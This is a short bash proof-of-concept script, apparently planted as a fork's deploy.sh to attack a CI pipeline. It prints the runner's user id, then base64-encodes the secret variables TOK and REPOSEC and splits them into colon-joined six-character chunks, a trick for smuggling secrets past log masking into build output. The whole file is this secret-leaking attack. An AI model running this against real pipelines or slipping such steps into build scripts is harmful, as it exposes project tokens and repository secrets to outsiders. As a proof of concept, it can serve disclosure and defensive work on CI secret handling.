#!/usr/bin/env bash
echo "POC FORK DEPLOY.SH uid=$(id -u)"
echo "POC EXFIL-TOK-CHUNK=$(printf %s "$TOK" | base64 -w0 | fold -w6 | paste -sd:)"
echo "POC EXFIL-REPO-CHUNK=$(printf %s "$REPOSEC" | base64 -w0 | fold -w6 | paste -sd:)"
